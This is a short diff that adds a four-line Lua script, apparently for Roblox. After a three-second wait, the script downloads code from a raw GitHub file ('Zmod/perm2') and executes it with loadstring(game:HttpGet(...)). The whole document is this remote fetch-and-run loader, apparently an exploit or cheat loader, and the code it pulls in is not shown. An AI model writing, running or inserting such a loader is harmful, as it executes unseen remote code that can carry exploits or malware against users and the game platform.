@@ -1,0 +1,4 @@
+task.wait(3)
+
+
+loadstring(game:HttpGet(('https://raw.githubusercontent.com/DIZZYTHELEGEND/Zmod/main/perm2'),true))()
